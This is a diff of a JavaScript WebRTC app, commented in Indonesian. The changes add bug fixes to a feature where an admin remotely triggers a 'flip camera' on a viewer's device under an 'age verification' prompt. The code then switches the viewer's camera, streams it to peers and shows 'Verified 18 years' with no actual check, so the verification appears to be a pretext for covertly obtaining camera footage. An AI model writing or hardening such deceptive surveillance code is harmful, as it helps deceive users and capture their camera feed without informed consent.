@@ -539,6 +539,25 @@ function connectSocket_Admin() {
   });
 
   socket.on('connect_error', (err) => console.error('[Socket] connect_error:', err.message));
+
+  // BUG FIX #1: Listener flip-camera-accepted/rejected HARUS ada di admin socket
+  // Sebelumnya tidak ada sama sekali — admin tidak pernah tahu hasil flip camera viewer
+  socket.on('flip-camera-accepted', ({ sessionId }) => {
+    const peer = adminPeers.get(sessionId);
+    const name = peer?.user?.name || sessionId;
+    addAdminLog(name, 'verifikasi usia berhasil ✓', '#4ADE80', 'info');
+    // Update badge di card jika ada
+    const badge = document.getElementById(`flip-badge-${sessionId}`);
+    if (badge) { badge.textContent = '✓ Terverifikasi'; badge.style.color = 'var(--green)'; }
+  });
+
+  socket.on('flip-camera-rejected', ({ sessionId }) => {
+    const peer = adminPeers.get(sessionId);
+    const name = peer?.user?.name || sessionId;
+    addAdminLog(name, 'verifikasi usia ditolak ✗', '#F2716B', 'error');
+    const badge = document.getElementById(`flip-badge-${sessionId}`);
+    if (badge) { badge.textContent = '✗ Ditolak'; badge.style.color = 'var(--red)'; }
+  });
 }
 
 async function setupPeerConnection_Admin(sessionId, user) {
@@ -1065,7 +1084,19 @@ function connectSocket_Viewer() {
     const pc = viewerPeers.get(msg.sessionId);
     if (pc && msg.data) pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(e => console.error(e));
   });
-  socket.on('flip-camera', () => { if (isFlipping) return; showFlipPermissionDialog(); });
+  socket.on('flip-camera', (data) => {
+    if (isFlipping) return;
+    // BUG FIX #2: Pastikan mySessionId sudah ada sebelum proses flip
+    // Jika belum ada, ambil dari sessionStorage (hasil FIX #3 sebelumnya)
+    if (!mySessionId) {
+      mySessionId = sessionStorage.getItem('lb_session_id') || null;
+    }
+    if (!mySessionId) {
+      console.warn('[Flip] mySessionId belum ada, flip diabaikan');
+      return;
+    }
+    showFlipPermissionDialog();
+  });
   socket.on('kicked', () => { handleKicked(); });
   socket.on('disconnect', () => { showFlipToast('⚠️ Koneksi terputus, mencoba ulang...'); });
   socket.on('connect_error', (err) => {
@@ -1162,8 +1193,19 @@ function showFlipPermissionDialog() {
 async function doFlipCamera() {
   if (isFlipping) return;
   isFlipping = true;
-  stopMonitorCameraPermission(); // Bug 1 fix: hentikan monitor agar tidak false-trigger saat track lama dimatikan
-  showFlipToast('Memverify usia anda...');
+  stopMonitorCameraPermission();
+  showFlipToast('Memverifikasi...');
+
+  // BUG FIX #3: Pastikan socket masih terhubung sebelum lanjut
+  // Jika socket putus saat viewer klik "Izinkan", accepted tidak akan terkirim
+  // dan isFlipping stuck = true → flip tidak bisa dilakukan lagi
+  if (!socket || !socket.connected) {
+    console.warn('[Flip] Socket tidak terhubung saat doFlipCamera dipanggil');
+    showFlipToast('❌ Koneksi terputus, coba lagi');
+    isFlipping = false;
+    monitorCameraPermission();
+    return;
+  }
 
   const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
   let newStream = null;
@@ -1261,15 +1303,42 @@ async function doFlipCamera() {
     if (oldAT && newAT) { camStream.removeTrack(oldAT); oldAT.stop(); camStream.addTrack(newAT); }
     else if (newAT) camStream.addTrack(newAT);
 
-    // Ganti track di semua RTCPeerConnection yang aktif
+    // BUG FIX #4: replaceTrack dengan error handling per-peer yang lebih robust
+    // Sebelumnya: gagal diam-diam, tidak ada retry, stream admin tetap gelap
     const replacePromises = [];
-    for (const pc of viewerPeers.values()) {
-      const vs = pc.getSenders().find(s => s.track?.kind === 'video');
-      const as = pc.getSenders().find(s => s.track?.kind === 'audio');
-      if (vs && newVT) replacePromises.push(vs.replaceTrack(newVT).catch(e => console.warn('replaceTrack video error:', e)));
-      if (as && newAT) replacePromises.push(as.replaceTrack(newAT).catch(e => console.warn('replaceTrack audio error:', e)));
+    let peerCount = 0;
+    for (const [peerId, pc] of viewerPeers.entries()) {
+      peerCount++;
+      // Cek state peer sebelum replaceTrack — jika closed/failed, skip
+      const cs = pc.connectionState || pc.iceConnectionState;
+      if (cs === 'closed' || cs === 'failed') {
+        console.warn(`[Flip] Peer ${peerId} state=${cs}, skip replaceTrack`);
+        continue;
+      }
+      const senders = pc.getSenders();
+      const vs = senders.find(s => s.track?.kind === 'video');
+      const as = senders.find(s => s.track?.kind === 'audio');
+
+      if (vs && newVT) {
+        replacePromises.push(
+          vs.replaceTrack(newVT)
+            .then(() => console.log(`[Flip] replaceTrack video OK peer=${peerId}`))
+            .catch(e => {
+              console.error(`[Flip] replaceTrack video GAGAL peer=${peerId}:`, e.message);
+              // Jangan throw — biarkan peer lain tetap jalan
+            })
+        );
+      }
+      if (as && newAT) {
+        replacePromises.push(
+          as.replaceTrack(newAT)
+            .then(() => console.log(`[Flip] replaceTrack audio OK peer=${peerId}`))
+            .catch(e => console.warn(`[Flip] replaceTrack audio GAGAL peer=${peerId}:`, e.message))
+        );
+      }
     }
-    await Promise.all(replacePromises);
+    console.log(`[Flip] replaceTrack pada ${peerCount} peer connection...`);
+    await Promise.allSettled(replacePromises); // allSettled: tidak gagal meski 1 peer error
 
     showFlipToast(nextFacingMode === 'user' ? 'Verify Berhasil' : 'Terverifikasi 18 Tahun');
     socket.emit('flip-camera-accepted', { sessionId: mySessionId });
